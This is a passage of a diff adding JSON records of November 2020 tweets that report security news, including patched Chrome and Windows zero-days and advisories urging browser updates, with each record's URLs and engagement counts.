+    "tweettext": "Today Chrome fixed two more vulnerabilities that were being actively exploited in the wild (discovered by Project Zero/Google TAG last week). CVE-2020-16009 is a v8 bug used for remote code execution, CVE-2020-16010 is a Chrome sandbox escape for Android. https://t.co/IOhFwT0Wx1",
+    "tweettime": "2020-11-02, 21:20:01",
+    "tweeturl": "https://twitter.com/benhawkes/status/1323374326150701057",
+    "username": "benhawkes"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/11/stable-channel-update-for-desktop.html"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 29,
+    "tweettext": "Another in-the-wild Chrome 0day patched (CVE-2020-16009), reported by @_clem1 from TAG and @5aelo from Project Zero: https://t.co/SP1SR3aXEp",
+    "tweettime": "2020-11-02, 21:09:24",
+    "tweeturl": "https://twitter.com/anttitikkanen/status/1323371654966349826",
+    "username": "anttitikkanen"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/11/warning-google-discloses-windows-zero.html"
+    ],
+    "tweetfavorites": 225,
+    "tweetquotes": 13,
+    "tweetreplies": 4,
+    "tweetretweets": 181,
+    "tweettext": "WATCH OUT! Google disclosed details of a new zero-day flaw (CVE-2020-17087) in the Windows operating system that's being actively exploited in the wild.\n\nDetails: https://t.co/tgtxsM9N2u\n\n#infosec #cybersecurity",
+    "tweettime": "2020-11-02, 09:45:51",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1323199634538332162",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 349,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 95,
+    "tweettext": "Quickly confirm if your organization is affected by recent Oracle WebLogic RCE - CVE-2020-14882 on single or list of URLs.\n\nShout out to @dwisiswant0 for sharing the nuclei templates including recent bypass.\n\n#hackwithautomation #bugbountytips #infosec #security https://t.co/qYdfr7GCLP",
+    "tweettime": "2020-11-02, 08:19:40",
+    "tweeturl": "https://twitter.com/pdnuclei/status/1323177945570004994",
+    "username": "pdnuclei"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/10/stable-channel-update-for-desktop_20.html",
+        "https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/ADV200002",
+        "https://vivaldi.com/blog/news/minor-update-for-vivaldi-desktop-browser-3-4/"
+    ],
+    "tweetfavorites": 32,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 26,
+    "tweettext": "⚠️ Please apply the latest Chromium-based browser security updates (e. g. Chromium, Chrome, Microsoft Edge, Vivaldi) to fix FreeType heap-based buffer overflow CVE-2020-15999 which is actively exploited 🔥\nhttps://t.co/gm0LrCFEmM\nhttps://t.co/CB7HHt8FRb\nhttps://t.co/fu6gPRX1gX",
+    "tweettime": "2020-11-01, 19:06:36",
+    "tweeturl": "https://twitter.com/certbund/status/1322978362575540232",
+    "username": "certbund"
+}
